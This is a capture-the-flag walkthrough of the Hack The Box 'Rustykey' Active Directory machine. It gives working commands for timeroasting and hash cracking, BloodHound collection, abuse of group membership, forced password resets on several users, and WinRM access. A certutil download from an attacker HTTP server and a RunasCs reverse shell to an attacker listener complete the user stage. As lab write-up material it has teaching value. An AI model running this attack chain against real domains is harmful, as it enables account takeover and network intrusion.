---
title: "Rustykey-HTB"
date: 2025-11-08 00:00:00 +0800
categories: [HTB]
tags: [Active Directory, Timeroast, Bloodhound, Privilege Escalation]
platform: HTB
author: 0xmr
image: /assets/img/posts/rustykey.jpg
excerpt: "Walkthrough for the Rustykey machine (Active Directory)"
---

# Rustykey HTB

> Walkthrough for the Rustykey machine (Active Directory). Edited by 0xmr.

## Machine Information

You start the Rustykey box with credentials for the following account:

- **Username:** `rr.parker`
- **Password:** `8#t5HE8L!W3A`

---

# Let's Get Started

## Enumeration

### Rustscan / Port discovery

Initial port scan shows common Windows services and an Active Directory environment. Port `389` reveals the domain name `rustykey.htb` — this indicates an AD machine. Add the domain to `/etc/hosts` so it resolves to the target IP.

Example host mapping:
```
10.10.11.75    dc.rustykey.htb    dc.rustykey.htb
```

Example rustscan output (trimmed):

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-08 14:34:56Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: rustykey.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Global Catalog)
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664-49734/tcp open msrpc    syn-ack ttl 127 Microsoft Windows RPC (many high ports)
```

## Shares

When attempting SMB access with `NetExec` you may see `STATUS_NOT_SUPPORTED`. This indicates NTLM authentication is disabled on the box — use Kerberos (`-k`) instead.

Example (NTLM will fail):

```bash
NetExec smb 10.10.11.75 -u 'rr.parker' -p '8#t5HE8L!W3A'
# STATUS_NOT_SUPPORTED
```

Generate a Kerberos config and copy it to `/etc/krb5.conf` to avoid `KRB_AP_ERR_SKEW`:

```bash
NetExec smb dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k --generate-krb5-file krb5.conf

sudo cp krb5.conf /etc/krb5.conf
```

Sync the clock (or use `faketime` if needed):

```bash
ntpdate -u $ip
# or
rdate -n $ip
```

If clock skew persists, wrap commands with `faketime` (example uses `ntpdate -q` to obtain the DC time):

```bash
faketime "$(ntpdate -q dc.rustykey.htb | cut -d ' ' -f 1,2)" NetExec smb $target -u 'rr.parker' -p '8#t5HE8L!W3A' -k
```

If successful, you should see a positive authentication result.

---

## TimeRoasting

> TimeRoasting abuses Windows SNTP/NTP responses to obtain crackable hashes for machine accounts (RIDs). It can be run authenticated or unauthenticated depending on the method.

Example (authenticated timeroast using NetExec):

```bash
faketime "$(ntpdate -q dc.rustykey.htb | cut -d ' ' -f 1,2)" NetExec smb $target -u 'rr.parker' -p '8#t5HE8L!W3A' -k -M timeroast
```

Partial output (RID hashes):

```
TIMEROAST   ... 1125:$sntp-ms$be4357f7... 
```

Run `NetExec smb $target -M timeroast` to collect more hashes if needed.

### Crack the RID hash

Save the output to a file (e.g., `time.hash`) and run the included `timecracker.py` to perform a dictionary attack:

```bash
python3 timecracker.py time.hash /usr/share/wordlists/rockyou.txt
# [+] Cracked RID 1125 password: Rusty88!
```

---

## BloodHound Collection

Collect BloodHound data for AD relationship analysis:

```bash
faketime "$(ntpdate -q dc.rustykey.htb | cut -d ' ' -f 1,2)" bloodhound-python -c All -u rr.parker -p '8#t5HE8L!W3A' -d rustykey.htb -ns 10.10.11.75 --dns-tcp -dc dc.rustykey.htb
```

After analysis, you notice the computer account `IT-COMPUTER3$` has `AddSelf` (add computer to groups) permission.

![IT-COMPUTER3$ image](/assets/img/posts/it-computer3%24.png)

---

## Gaining Group Membership

Using the cracked machine account password (`Rusty88!`) we add the computer account to the `HELPDESK` group:

```bash
faketime "$(ntpdate -q dc.rustykey.htb | cut -d ' ' -f 1,2)" bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' add groupMember 'HELPDESK' 'IT-COMPUTER3$'
# [+] IT-COMPUTER3$ added to HELPDESK
```

Because `HELPDESK` had protections, remove the accounts from `Protected Objects` so password changes will succeed:

```bash
faketime "$(ntpdate -q dc.rustykey.htb | cut -d ' ' -f 1,2)" bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'Protected Objects' 'IT'

faketime "$(ntpdate -q dc.rustykey.htb | cut -d ' ' -f 1,2)" bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'Protected Objects' 'SUPPORT'
```

---

## Changing Passwords

Now change several user passwords (examples):

```bash
faketime "$(ntpdate -q dc.rustykey.htb | cut -d ' ' -f 1,2)" bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' set password GG.ANDERSON 'Password@123'
faketime "$(ntpdate -q dc.rustykey.htb | cut -d ' ' -f 1,2)" bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' set password EE.REED 'Password@123'
faketime "$(ntpdate -q dc.rustykey.htb | cut -d ' ' -f 1,2)" bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' set password DD.ALI 'Password@123'
faketime "$(ntpdate -q dc.rustykey.htb | cut -d ' ' -f 1,2)" bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' set password bb.morgan 'Password@123'
```

---

## Kerberos enctypes (krb5.conf)

If you encounter `KDC_ERR_ETYPE_NOSUPP`, add common enctypes to `krb5.conf` and copy it to `/etc/krb5.conf`:

```ini
[libdefaults]
    default_realm = RUSTYKEY.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    forwardable = yes
    default_tkt_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96 rc4-hmac des3-cbc-sha1
    default_tgs_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96 rc4-hmac des3-cbc-sha1
    permitted_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96 rc4-hmac des3-cbc-sha1

[realms]
    RUSTYKEY.HTB = {
        kdc = dc.rustykey.htb
        admin_server = dc.rustykey.htb
    }

[domain_realm]
    .rustykey.htb = RUSTYKEY.HTB
    rustykey.htb = RUSTYKEY.HTB
```

Then copy it:

```bash
sudo cp krb5.conf /etc/krb5.conf
```

---

## User Flag (Evil-WinRM)

Create a TGT with `impacket-getTGT`, set `KRB5CCNAME`, and connect with `evil-winrm`:

```bash
faketime "$(ntpdate -q dc.rustykey.htb | cut -d ' ' -f 1,2)" impacket-getTGT rustykey.htb/'bb.morgan':'Password@123'

export KRB5CCNAME=bb.morgan.ccache

faketime "$(ntpdate -q dc.rustykey.htb | cut -d ' ' -f 1,2)" evil-winrm -i dc.rustykey.htb -u bb.morgan -r rustykey.htb
```

---

## Stable shell via RunasCs.exe

Host `RunasCs.exe` and download it on the target, then run it to get a reverse shell:

```bash
# On attacker
python3 -m http.server 8000

# On target (PowerShell)
certutil -urlcache -split -f http://10.10.14.19:8000/RunasCs.exe RunasCs.exe

# Run as target user
.\RunasCs.exe gg.morgan Password@123 powershell -r 10.10.14.x:443
```

Listener example:

```bash
rlwrap ncat -lnvp 443
```

---

## Analyzing internal.pdf

From the user desktop we downloaded `internal.pdf` and `user.txt`.

```powershell
PS C:\Users\bb.morgan\Desktop> dir -force
-a----  6/4/2025  9:15 AM   1976 internal.pdf
-ar--- 11/8/2025  7:48 AM     34 user.txt

PS C:\Users\bb.morgan\Desktop> download internal.pdf
Info: Downloading C:\Users\bb.morgan\Desktop\internal.pdf to internal.pdf
Info: Download successful!
```

---

> Root part is coming soon...
